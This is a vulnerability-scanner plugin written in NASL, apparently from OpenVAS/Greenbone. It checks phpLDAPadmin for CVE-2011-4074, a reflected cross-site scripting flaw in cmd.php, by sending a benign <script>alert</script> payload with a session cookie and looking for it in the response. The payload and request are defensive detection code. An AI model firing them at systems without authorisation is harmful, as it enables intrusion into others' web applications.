if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802265" );
	script_version( "2020-11-10T06:17:23+0000" );
	script_tag( name: "last_modification", value: "2020-11-10 06:17:23 +0000 (Tue, 10 Nov 2020)" );
	script_tag( name: "creation_date", value: "2011-11-03 12:22:48 +0100 (Thu, 03 Nov 2011)" );
	script_cve_id( "CVE-2011-4074" );
	script_bugtraq_id( 50331 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "phpLDAPadmin '_debug' Cross Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "phpldapadmin_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "phpldapadmin/installed" );
	script_xref( name: "URL", value: "http://phpldapadmin.git.sourceforge.net/git/gitweb.cgi?p=phpldapadmin/phpldapadmin;a=commit;h=64668e882b8866fae0fa1b25375d1a2f3b4672e2" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/46551" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/70918" );
	script_xref( name: "URL", value: "http://openwall.com/lists/oss-security/2011/10/24/9" );
	script_xref( name: "URL", value: "https://bugzilla.redhat.com/show_bug.cgi?id=748538" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "phpLDAPadmin versions 1.2.0 through 1.2.1.1" );
	script_tag( name: "insight", value: "The flaw is due to improper validation of user-supplied input appended
  to the URL in cmd.php (when 'cmd' is set to '_debug'), which allows attackers to execute arbitrary HTML
  and script code in a user's browser session in the context of an affected site." );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more info." );
	script_tag( name: "summary", value: "This host is running phpLDAPadmin and is prone to cross site
  scripting vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
CPE = "cpe:/a:phpldapadmin_project:phpldapadmin";
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
req = http_get( item: NASLString( dir, "/index.php" ), port: port );
res = http_keepalive_send_recv( port: port, data: req );
cookie = eregmatch( pattern: "Set-Cookie: ([^;]*);", string: res );
if(isnull( cookie[1] )){
	exit( 0 );
}
cookie = cookie[1];
url = "/cmd.php?cmd=_debug&<script>alert('OV-XSS-Attack-Test')</script>";
req = http_get( item: dir + url, port: port );
req = NASLString( chomp( req ), "\r\nCookie: ", cookie, "\r\n\r\n" );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<script>alert('OV-XSS-Attack-Test')</script>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

